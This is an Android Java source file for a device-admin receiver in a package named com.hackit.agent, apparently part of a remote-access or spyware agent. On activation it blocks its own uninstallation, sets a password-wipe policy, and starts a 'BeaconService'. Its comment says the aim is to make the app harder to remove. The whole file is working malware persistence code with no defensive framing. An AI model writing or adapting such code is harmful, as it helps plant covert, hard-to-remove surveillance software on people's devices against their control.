package com.hackit.agent;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

/** Device-admin entry so the app is harder to uninstall casually. */
public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        Log.d("admin enabled");
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                // Blocked uninstall until the admin is explicitly removed.
                dpm.setUninstallBlocked(new android.content.ComponentName(context, AdminReceiver.class),
                        context.getPackageName(), true);
                dpm.setMaximumFailedPasswordsForWipe(
                        new android.content.ComponentName(context, AdminReceiver.class), 0);
            }
        } catch (Throwable exc) {
            Log.d("admin policy: " + exc);
        }
        BeaconService.start(context);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Log.d("admin disabled");
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                dpm.setUninstallBlocked(new android.content.ComponentName(context, AdminReceiver.class),
                        context.getPackageName(), false);
            }
        } catch (Throwable ignored) {
        }
    }
}
